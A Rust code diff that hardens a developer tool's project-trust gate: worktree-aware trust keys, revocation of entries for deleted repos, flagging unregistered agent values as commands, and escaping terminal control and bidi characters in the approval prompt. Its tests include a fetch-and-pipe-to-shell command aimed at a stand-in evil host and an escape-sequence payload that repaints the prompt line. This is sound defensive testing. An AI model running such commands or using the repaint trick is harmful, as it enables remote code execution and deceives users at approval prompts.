@@ -66,19 +66,75 @@ impl TrustStore {
     }
 
     /// Remove any approval for this project root. Returns true if one existed.
+    ///
+    /// Also tries the path exactly as given, so an entry can still be revoked
+    /// after its repository has been deleted or moved — at which point neither
+    /// the worktree resolution nor `canonicalize` can reproduce the key.
     pub fn revoke(&mut self, repo_root: &Path) -> bool {
-        self.inner.projects.remove(&key_for(repo_root)).is_some()
+        if self.inner.projects.remove(&key_for(repo_root)).is_some() {
+            return true;
+        }
+        let literal = repo_root.to_string_lossy().into_owned();
+        self.inner.projects.remove(&literal).is_some()
     }
 }
 
-/// The key a project root is stored under. Canonicalized so that symlinked or
-/// non-normalized paths resolve to the same entry; falls back to the path as
-/// given when the directory cannot be resolved.
+/// The key a project root is stored under.
+///
+/// Two normalizations, both needed for the same reason — the key has to be the
+/// *project*, not whichever directory the user happened to be standing in.
+///
+/// `main_repo_root` maps a linked worktree back to its source repo. Without it
+/// the two sides disagree: the gate is keyed on whatever `load_project_config`
+/// was handed, which for a command resolving from the cwd is the worktree,
+/// while `foundry trust` resolves the main repo. An approval recorded under one
+/// is never found under the other, so the command bails, prints a `foundry
+/// trust <path>` suggestion, and running it reports success and changes
+/// nothing — forever.
+///
+/// `canonicalize` then folds symlinked and non-normalized spellings of that
+/// root together. Each step falls back to its input, so an unresolvable path
+/// still produces a stable key rather than an error.
+///
+/// Note this normalizes only the *key*. The hash still covers the exact file
+/// that was loaded, so two worktrees of one project whose `.foundry.toml`
+/// contents differ are approved separately — which is the point of hashing.
 fn key_for(repo_root: &Path) -> String {
-    std::fs::canonicalize(repo_root)
-        .unwrap_or_else(|_| repo_root.to_path_buf())
+    let project_root =
+        crate::git::main_repo_root(repo_root).unwrap_or_else(|_| repo_root.to_path_buf());
+    canonicalize_existing_prefix(&project_root)
         .to_string_lossy()
         .into_owned()
+}
+
+/// Canonicalize as much of `path` as still exists, keeping the rest verbatim.
+///
+/// A plain `canonicalize` fails outright on a path that no longer exists, which
+/// would leave an entry unrevocable once its repository is deleted — the case
+/// that most needs revoking. On macOS that bites even for a path the user
+/// typed correctly, because the key was stored through the `/var` ->
+/// `/private/var` symlink and resolving it again requires the directory to
+/// still be there.
+fn canonicalize_existing_prefix(path: &Path) -> PathBuf {
+    if let Ok(resolved) = std::fs::canonicalize(path) {
+        return resolved;
+    }
+
+    // Walk up until something resolves, then re-append what was trimmed.
+    let mut trimmed: Vec<std::ffi::OsString> = Vec::new();
+    let mut cursor = path;
+    while let (Some(parent), Some(name)) = (cursor.parent(), cursor.file_name()) {
+        trimmed.push(name.to_os_string());
+        if let Ok(base) = std::fs::canonicalize(parent) {
+            return trimmed.iter().rev().fold(base, |mut acc, part| {
+                acc.push(part);
+                acc
+            });
+        }
+        cursor = parent;
+    }
+
+    path.to_path_buf()
 }
 
 pub fn trust_store_path() -> Result<PathBuf> {
@@ -118,8 +174,8 @@ pub fn executable_directives(config: &ProjectConfig) -> Vec<String> {
     // BTreeMap-like stable ordering so the prompt reads the same every time.
     let mut pane_names: Vec<&String> = config.panes.keys().collect();
     pane_names.sort();
-    for pane_name in pane_names {
-        if let Some(cmd) = config.panes[pane_name].command.as_deref() {
+    for pane_name in &pane_names {
+        if let Some(cmd) = config.panes[*pane_name].command.as_deref() {
             found.push(format!("pane '{pane_name}' command: {cmd}"));
         }
     }
@@ -128,7 +184,38 @@ pub fn executable_directives(config: &ProjectConfig) -> Vec<String> {
         found.push(format!("custom agent command: {cmd}"));
     }
 
+    // An `agent` value is normally a registry key like "claude", which resolves
+    // to a fixed command line. An identifier that is *not* in the registry is
+    // returned verbatim by `build_agent_command_with_plan` and becomes the
+    // pane's shell command — so setting `agent` is a second way to name an
+    // arbitrary command to run, and it has to be approved like `agent_command`.
+    if let Some(ref agent) = config.agent
+        && let Some(directive) = raw_agent_directive("agent", agent)
+    {
+        found.push(directive);
+    }
+    for pane_name in &pane_names {
+        if let Some(agent) = config.panes[*pane_name].agent.as_deref()
+            && let Some(directive) =
+                raw_agent_directive(&format!("pane '{pane_name}' agent"), agent)
+        {
+            found.push(directive);
+        }
+    }
+
     found
+}
+
+/// Describe an `agent` value that would run as a raw command, if it would.
+///
+/// Returns `None` for a registered agent id and for `"custom"` (whose command
+/// lives in `agent_command`, which is reported separately) — those name a
+/// program foundry knows how to launch rather than a string it hands to a shell.
+fn raw_agent_directive(label: &str, agent: &str) -> Option<String> {
+    if agent == "custom" || crate::config::agent_capabilities(agent).is_some() {
+        return None;
+    }
+    Some(format!("{label} runs as a raw command: {agent}"))
 }
 
 /// Ensure the project config at `repo_root` has been approved by the user.
@@ -194,8 +281,63 @@ pub fn ensure_trusted(repo_root: &Path, contents: &str, config: &ProjectConfig) 
     Ok(())
 }
 
+/// Longest directive shown, in bytes after escaping. Long enough for any real
+/// command; short enough that one entry cannot fill the screen.
+const MAX_DIRECTIVE_DISPLAY_LEN: usize = 400;
+
+/// Most directives shown before the rest are summarised.
+const MAX_DIRECTIVES_DISPLAYED: usize = 30;
+
+/// Render one directive safely for display.
+///
+/// Directive text is copied verbatim out of `.foundry.toml`, so the repository
+/// chooses these bytes — and this is printed immediately above "Trust this
+/// project config? \[y/N\]". A directive carrying `ESC [ 2 K` and a carriage
+/// return erases the line it was just printed on and redraws it, so the command
+/// the user is being asked to approve can be replaced on screen by an innocuous
+/// one. TOML rejects raw control bytes but accepts `` escapes, so the
+/// attack file is plain ASCII on disk and survives review tooling untouched.
+///
+/// Escaping is applied first and the length cap second, so the cap counts what
+/// is actually drawn. The cap is not redundant: a directive of purely printable
+/// characters carries no control bytes for the escaper to catch and still
+/// scrolls the prompt off the screen.
+fn render_directive(directive: &str) -> String {
+    let escaped = crate::str_util::sanitize_for_display(directive);
+
+    let capped = crate::str_util::truncate_on_char_boundary(&escaped, MAX_DIRECTIVE_DISPLAY_LEN);
+    if capped.len() < escaped.len() {
+        format!("{capped}… (truncated)")
+    } else {
+        capped.to_string()
+    }
+}
+
+/// Render the directive list for display, sanitized and bounded.
+///
+/// Capping the count matters as much as capping each entry: a config can hold
+/// hundreds of innocuous-looking scripts with one hostile entry, which scrolls
+/// the prompt away just as effectively as one enormous line.
+pub fn render_directives(directives: &[String]) -> Vec<String> {
+    let mut lines: Vec<String> = directives
+        .iter()
+        .take(MAX_DIRECTIVES_DISPLAYED)
+        .map(|d| render_directive(d))
+        .collect();
+
+    if let Some(hidden) = directives.len().checked_sub(MAX_DIRECTIVES_DISPLAYED)
+        && hidden > 0
+    {
+        lines.push(format!(
+            "… and {hidden} more (review {} directly)",
+            ".foundry.toml"
+        ));
+    }
+    lines
+}
+
 fn format_directives(directives: &[String]) -> String {
-    directives
+    render_directives(directives)
         .iter()
         .map(|d| format!("  - {d}"))
         .collect::<Vec<_>>()
@@ -209,6 +351,76 @@ mod tests {
 
     fn parse(toml_src: &str) -> ProjectConfig {
         toml::from_str(toml_src).unwrap()
+    }
+
+    /// A directive is repo-authored text printed immediately above the
+    /// approval prompt, so it must not be able to repaint the screen.
+    #[test]
+    fn render_neutralises_terminal_control_sequences() {
+        let payload = "curl evil|sh\u{1b}[2K\rpnpm install";
+        let rendered = render_directive(payload);
+        assert!(!rendered.contains('\u{1b}'), "ESC survived: {rendered:?}");
+        assert!(!rendered.contains('\r'), "CR survived: {rendered:?}");
+        assert!(
+            rendered.contains("curl evil|sh"),
+            "the real command must stay visible: {rendered:?}"
+        );
+    }
+
+    /// Bidi overrides can reorder a line without any C0 byte.
+    #[test]
+    fn render_neutralises_bidi_and_zero_width_characters() {
+        for c in ['\u{202E}', '\u{2066}', '\u{200B}', '\u{feff}', '\u{00ad}'] {
+            let rendered = render_directive(&format!("safe{c}unsafe"));
+            assert!(!rendered.contains(c), "{c:?} survived: {rendered:?}");
+        }
+    }
+
+    /// Ordinary commands must stay readable — this text is the whole point of
+    /// the prompt, so over-escaping is its own failure.
+    #[test]
+    fn render_leaves_ordinary_commands_untouched() {
+        for cmd in [
+            "pnpm install && pnpm build",
+            "sed -i '' 's/PORT=3000/PORT=$VITE_PORT/' .env",
+            "echo \"café 日本語\" > notes.txt",
+            "cp .env.example .env # setup",
+        ] {
+            assert_eq!(render_directive(cmd), cmd, "mangled: {cmd}");
+        }
+    }
+
+    /// Printable text carries no control bytes for the escaper to catch, so the
+    /// length cap is what stops one directive scrolling the prompt away.
+    #[test]
+    fn render_caps_an_overlong_directive() {
+        let rendered = render_directive(&"x".repeat(4000));
+        assert!(rendered.len() < 500, "not capped: {} bytes", rendered.len());
+        assert!(rendered.ends_with("… (truncated)"));
+    }
+
+    /// Many short directives scroll just as well as one long one.
+    #[test]
+    fn render_directives_caps_the_list() {
+        let many: Vec<String> = (0..300).map(|i| format!("setup script {i}")).collect();
+        let lines = render_directives(&many);
+        assert!(
+            lines.len() <= MAX_DIRECTIVES_DISPLAYED + 1,
+            "got {}",
+            lines.len()
+        );
+        assert!(
+            lines.last().unwrap().contains("270 more"),
+            "{:?}",
+            lines.last()
+        );
+    }
+
+    /// A short list must not be summarised.
+    #[test]
+    fn render_directives_leaves_a_short_list_alone() {
+        let few = vec!["a".to_string(), "b".to_string()];
+        assert_eq!(render_directives(&few), few);
     }
 
     #[test]
@@ -270,8 +482,14 @@ mod tests {
         assert!(directives[0].contains("my-agent --flag"));
     }
 
-    /// A pane override that only sets env must not trigger a prompt — env is
-    /// not executed on its own.
+    /// A pane override that only sets env must not trigger a prompt.
+    ///
+    /// This holds only because both halves of an export are constrained. Names
+    /// are checked against a shell identifier at config load
+    /// (`config::validation::validate_env_name`), since they are interpolated
+    /// bare; values are quoted and escaped by `terminal::shell_export`. If
+    /// either side were left raw, an env-only config would be executable and
+    /// the absence of a prompt here would be a hole.
     #[test]
     fn pane_env_only_override_is_not_a_directive() {
         let config = parse(
@@ -281,6 +499,61 @@ mod tests {
         "#,
         );
         assert!(executable_directives(&config).is_empty());
+    }
+
+    /// An agent identifier that is not in the registry is handed to a shell
+    /// verbatim, so a repo setting one is naming a command to run.
+    #[test]
+    fn unregistered_agent_is_a_directive() {
+        let config = parse(r#"agent = "curl https://evil.example/x.sh | sh""#);
+        let directives = executable_directives(&config);
+        assert_eq!(directives.len(), 1, "got {directives:?}");
+        assert!(directives[0].contains("curl https://evil.example/x.sh | sh"));
+    }
+
+    /// The per-pane form is the one that works regardless of global config, so
+    /// it must be reported too.
+    #[test]
+    fn unregistered_pane_agent_is_a_directive() {
+        let config = parse(
+            r#"
+            [panes.agent]
+            agent = "touch /tmp/pwned"
+        "#,
+        );
+        let directives = executable_directives(&config);
+        assert_eq!(directives.len(), 1, "got {directives:?}");
+        assert!(directives[0].contains("pane 'agent' agent"));
+        assert!(directives[0].contains("touch /tmp/pwned"));
+    }
+
+    /// A real agent name resolves to a fixed command line, so naming one is not
+    /// a directive — otherwise the prompt would fire for every project that
+    /// simply prefers a different agent, and get clicked through.
+    #[test]
+    fn registered_agent_is_not_a_directive() {
+        for agent in ["claude", "codex", "gemini", "aider", "pi"] {
+            let config = parse(&format!("agent = \"{agent}\""));
+            assert!(
+                executable_directives(&config).is_empty(),
+                "{agent} should not be a directive"
+            );
+        }
+    }
+
+    /// `custom` defers to `agent_command`, which is reported on its own — it
+    /// must not be double-reported or reported as a raw command itself.
+    #[test]
+    fn custom_agent_reports_only_the_command() {
+        let config = parse(
+            r#"
+            agent = "custom"
+            agent_command = "my-agent --flag"
+        "#,
+        );
+        let directives = executable_directives(&config);
+        assert_eq!(directives.len(), 1, "got {directives:?}");
+        assert!(directives[0].contains("my-agent --flag"));
     }
 
     #[test]
@@ -312,6 +585,62 @@ mod tests {
 
         assert!(store.is_trusted(&repo, &hash_config("command = \"safe\"")));
         assert!(!store.is_trusted(&repo, &hash_config("command = \"evil\"")));
+    }
+
+    /// The gate is keyed on whatever path `load_project_config` was handed —
+    /// the worktree, for a command resolving from the cwd — while `foundry
+    /// trust` resolves from wherever the user ran it. Both must land on the
+    /// same key or an approval is recorded that nothing ever looks up.
+    #[test]
+    fn a_linked_worktree_and_its_main_repo_share_one_key() {
+        let dir = TempDir::new().unwrap();
+        let main = dir.path().join("main");
+        let worktree = dir.path().join("wt");
+        std::fs::create_dir_all(&main).unwrap();
+
+        let git = |args: &[&str], cwd: &Path| {
+            std::process::Command::new("git")
+                .args(args)
+                .current_dir(cwd)
+                .output()
+                .unwrap()
+        };
+        git(&["init", "-q"], &main);
+        git(&["config", "user.email", "t@example.com"], &main);
+        git(&["config", "user.name", "t"], &main);
+        git(&["commit", "-q", "--allow-empty", "-m", "i"], &main);
+        git(&["branch", "-q", "feat"], &main);
+        git(
+            &["worktree", "add", "-q", worktree.to_str().unwrap(), "feat"],
+            &main,
+        );
+        assert!(worktree.exists(), "worktree setup failed");
+
+        assert_eq!(
+            key_for(&worktree),
+            key_for(&main),
+            "worktree and main repo must map to the same trust key"
+        );
+    }
+
+    /// An entry has to stay revocable after its repository is gone — that is
+    /// exactly when a stale approval wants removing, and `canonicalize` can no
+    /// longer resolve the path it was stored under.
+    #[test]
+    fn revoke_works_after_the_repo_is_deleted() {
+        let dir = TempDir::new().unwrap();
+        let repo = dir.path().join("doomed");
+        std::fs::create_dir_all(&repo).unwrap();
+
+        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
+        store.trust(&repo, "abc");
+        assert!(store.is_trusted(&repo, "abc"));
+
+        std::fs::remove_dir_all(&repo).unwrap();
+        assert!(
+            store.revoke(&repo),
+            "a deleted repo's approval must still be removable"
+        );
     }
 
     #[test]
